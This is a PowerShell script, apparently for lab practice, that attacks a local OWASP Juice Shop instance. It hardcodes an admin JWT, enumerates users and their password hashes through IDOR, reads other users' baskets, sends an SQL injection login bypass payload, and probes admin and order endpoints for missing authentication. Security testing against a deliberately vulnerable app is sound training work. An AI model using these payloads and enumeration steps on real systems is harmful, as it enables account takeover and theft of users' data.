$TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMTcgMTU6MDQ6MzQuODIzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMTcgMTU6MDk6MTkuODU5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3NjQzODU2N30.s3cYgVUJ63W22kS3SOACIDUIY6mqb8WmTlbNrQPusQZ-nMSO6QNyfQW3lTLw8QtDvpXW_9QiUgJNKQhbl2YF7ouoa3TcGykM0hOhvNNf7thh2vZ36sPSWRqYpVGcr-q6kn1SpVjZnzS93UCPkT5ixYCs4brFUp6IzgXEGLvb-kU"
$H = @{"Authorization"="Bearer $TOKEN"}

Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "  WebFuzzer — JuiceShop Vulnerability Test Report" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

# -------------------- IDOR: GET other users' data --------------------
Write-Host "`n[1] IDOR — Enumerating users via /api/Users/{id}" -ForegroundColor Magenta
$idorCount = 0
for ($id = 1; $id -le 22; $id++) {
    try {
        $r = Invoke-RestMethod "http://localhost:3000/api/Users/$id" -Headers $H -TimeoutSec 5 -ErrorAction Stop
        if ($r.data) {
            $idorCount++
            Write-Host "  [200] ID=$id | email=$($r.data.email) | role=$($r.data.role) | pwHash=$($r.data.password.Substring(0,10))..." -ForegroundColor Red
        }
    } catch {}
}
Write-Host "  => $idorCount users exposed via IDOR!" -ForegroundColor Red

# -------------------- IDOR: Access other users' baskets --------------------
Write-Host "`n[2] IDOR — Cross-user basket access /rest/basket/{id}" -ForegroundColor Magenta
for ($bid = 1; $bid -le 5; $bid++) {
    try {
        $r = Invoke-RestMethod "http://localhost:3000/rest/basket/$bid" -Headers $H -TimeoutSec 5 -ErrorAction Stop
        if ($r.data) {
            Write-Host "  [200] Basket $bid accessible | Products=$($r.data.Products.Count)" -ForegroundColor Yellow
        }
    } catch {}
}

# -------------------- SQLi Login Bypass --------------------
Write-Host "`n[3] SQLi — Login bypass on /rest/user/login" -ForegroundColor Magenta
$bodyJson = '{"email":"'' OR 1=1--","password":"x"}'
try {
    $headers2 = @{"Content-Type"="application/json"}
    $r = Invoke-RestMethod "http://localhost:3000/rest/user/login" -Method POST -Body $bodyJson -Headers $headers2 -TimeoutSec 5 -ErrorAction Stop
    Write-Host "  [BYPASS] SQLi login SUCCESSFUL!" -ForegroundColor Red
    Write-Host "  Token (first 80 chars): $($r.authentication.token.Substring(0,80))..." -ForegroundColor Red
    Write-Host "  Logged as: $($r.authentication.umail)" -ForegroundColor Red
} catch {
    Write-Host "  [-] SQLi bypass failed: $($_.Exception.Response.StatusCode)" -ForegroundColor Gray
}

# -------------------- Admin config exposure --------------------
Write-Host "`n[4] Info Disclosure — Admin endpoints" -ForegroundColor Magenta
$adminEPs = @(
    "http://localhost:3000/rest/admin/application-configuration",
    "http://localhost:3000/rest/admin/application-version"
)
foreach ($ep in $adminEPs) {
    try {
        $r = Invoke-RestMethod $ep -TimeoutSec 5 -ErrorAction Stop
        Write-Host "  [NO AUTH NEEDED] $ep" -ForegroundColor Red
        $r | ConvertTo-Json -Depth 1 | Select-Object -First 5 | ForEach-Object { Write-Host "    $_" -ForegroundColor Yellow }
    } catch {
        try {
            $r = Invoke-RestMethod $ep -Headers $H -TimeoutSec 5 -ErrorAction Stop
            Write-Host "  [AUTH OK] $ep accessible with admin token" -ForegroundColor Yellow
        } catch {
            Write-Host "  [-] $ep => $($_.Exception.Response.StatusCode)" -ForegroundColor Green
        }
    }
}

# -------------------- Broken Access Control: Order data --------------------
Write-Host "`n[5] Broken Access Control — Order history without auth" -ForegroundColor Magenta
try {
    $r = Invoke-RestMethod "http://localhost:3000/api/Orders" -TimeoutSec 5 -ErrorAction Stop
    Write-Host "  [NO AUTH] /api/Orders returns $($r.data.Count) orders!" -ForegroundColor Red
} catch {
    Write-Host "  [-] /api/Orders requires auth: $($_.Exception.Response.StatusCode)" -ForegroundColor Green
}

# ---- With auth ----
try {
    $r = Invoke-RestMethod "http://localhost:3000/api/Orders" -Headers $H -TimeoutSec 5 -ErrorAction Stop
    Write-Host "  [AUTH] /api/Orders with token: $($r.data.Count) orders visible" -ForegroundColor Yellow
} catch {}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "  Test complete!" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan
